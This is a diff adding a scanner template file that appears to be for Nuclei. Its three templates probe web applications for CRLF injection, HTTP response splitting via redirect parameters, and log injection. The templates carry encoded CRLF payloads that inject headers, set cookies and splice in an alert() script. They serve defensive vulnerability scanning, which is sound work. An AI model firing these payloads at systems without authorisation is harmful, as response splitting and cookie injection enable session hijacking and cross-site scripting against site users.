@@ -1,0 +1,111 @@
+id: crlf-injection
+
+info:
+  name: CRLF Injection / HTTP Response Splitting
+  author: ancarna
+  severity: medium
+  description: Detects CRLF injection vulnerabilities that can lead to HTTP response splitting
+  tags: crlf,injection,header,response-splitting
+  classification:
+    cwe-id: 113
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+    - https://cwe.mitre.org/data/definitions/113.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Basic CRLF injection
+        - "%0d%0aX-Injected: CRLF_INJECTION_TEST"
+        - "%0aX-Injected: CRLF_INJECTION_TEST"
+        - "%0dX-Injected: CRLF_INJECTION_TEST"
+        - "%0D%0AX-Injected: CRLF_INJECTION_TEST"
+        # Double URL encoded
+        - "%250d%250aX-Injected: CRLF_INJECTION_TEST"
+        - "%25%30%64%25%30%61X-Injected: CRLF_INJECTION_TEST"
+        # Unicode variations
+        - "%E5%98%8A%E5%98%8DX-Injected: CRLF_INJECTION_TEST"
+        # With null byte
+        - "%00%0d%0aX-Injected: CRLF_INJECTION_TEST"
+        # HTTP response splitting for XSS
+        - "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('CRLF_XSS')</script>"
+        - "%0d%0a%0d%0a<script>alert('CRLF_XSS')</script>"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-Injected: CRLF_INJECTION_TEST"
+
+      - type: word
+        part: body
+        words:
+          - "<script>alert('CRLF_XSS')</script>"
+
+---
+id: crlf-injection-redirect
+
+info:
+  name: CRLF Injection in Redirect
+  author: ancarna
+  severity: medium
+  description: Detects CRLF injection in redirect parameters
+  tags: crlf,injection,redirect
+  classification:
+    cwe-id: 113
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/redirect?url={{payload}}"
+      - "{{BaseURL}}/goto?url={{payload}}"
+      - "{{BaseURL}}/out?url={{payload}}"
+      - "{{BaseURL}}/link?url={{payload}}"
+      - "{{BaseURL}}/return?url={{payload}}"
+    payloads:
+      payload:
+        - "http://example.com%0d%0aSet-Cookie: CRLF_TEST=1"
+        - "/%0d%0aSet-Cookie: CRLF_TEST=1"
+        - "http://example.com%0d%0aX-CRLF-Test: Vulnerable"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: CRLF_TEST=1"
+          - "X-CRLF-Test: Vulnerable"
+        condition: or
+
+---
+id: crlf-log-injection
+
+info:
+  name: CRLF Log Injection
+  author: ancarna
+  severity: low
+  description: Detects CRLF injection that may affect log files
+  tags: crlf,injection,log
+  classification:
+    cwe-id: 117
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "test%0d%0aFAKE_LOG_ENTRY: Injected line"
+        - "test%0aFAKE_LOG_ENTRY: Injected line"
+        - "test\r\nFAKE_LOG_ENTRY: Injected line"
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 400
+          - 500
